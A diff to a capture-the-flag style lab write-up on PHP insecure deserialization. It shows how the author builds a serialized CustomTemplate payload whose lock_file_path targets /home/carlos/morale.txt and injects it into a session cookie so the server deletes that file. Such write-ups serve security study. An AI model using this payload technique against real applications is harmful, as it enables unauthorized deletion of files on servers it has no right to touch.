@@ -114,3 +114,63 @@ Thu Jan 19 05:03:47 PM EST 2023
 Destroying MyDestructableClass
 ```
 
+# Step 3 Create a malicious serialized object
+
+Taking a look at the session cookie again:
+
+**Decoded Cookie**
+```php
+O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"m1xi9a2zpmwcg86w5bpnqvue9fnq4dkg";}
+```
+
+I see that it is a 4-charater long object called "User", with 2 parameters:
+1. key of string "username" with the value of string "wiener"
+2. key of string "access_token" with the value of "m1xi9a2zpmwcg86w5bpnqvue9fnq4dkg"
+
+
+To create the malicous serialized object, I need to get the lengths of the strings. First I need the length of the class name:
+
+```php
+class CustomTemplate
+```
+Finding the length with python:
+
+```bash
+└─$ python -c 'print(len("CustomTemplate"))'                  
+14
+```
+
+Making the first part of my malicious code:
+
+```php
+O:14:"CustomTemplate"
+```
+
+Next I need to determine the attributes I want to pass:
+
+There is only 1 attribute: the key `lock_file_path` with the value of the target file I want to delete (`/home/carlos/morale.txt`). Both of these are strings, so I need to also get their lengths with python:
+
+```bash
+└─$ python -c 'print(len("lock_file_path"))'
+14
+└─$ python -c 'print(len("/home/carlos/morale.txt"))'
+23
+```
+This makes the final payload:
+
+```php
+O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
+```
+# Step 4 Replace session cookie with malicous serialized object
+
+I capture the request for my account:
+
+![image](https://user-images.githubusercontent.com/83407557/213577210-072d27b6-1800-4c1c-86ed-c3e16dbbc4d3.png)
+
+and inject my payload into the session cookie:
+
+![image](https://user-images.githubusercontent.com/83407557/213577336-c8a8da67-5aa5-4e0e-842c-c519f3b45f55.png)
+
+Doing so deletes the file and solves the lab:
+
+![image](https://user-images.githubusercontent.com/83407557/213577428-e89dbeee-f099-4811-a476-f7dc2035ad52.png)
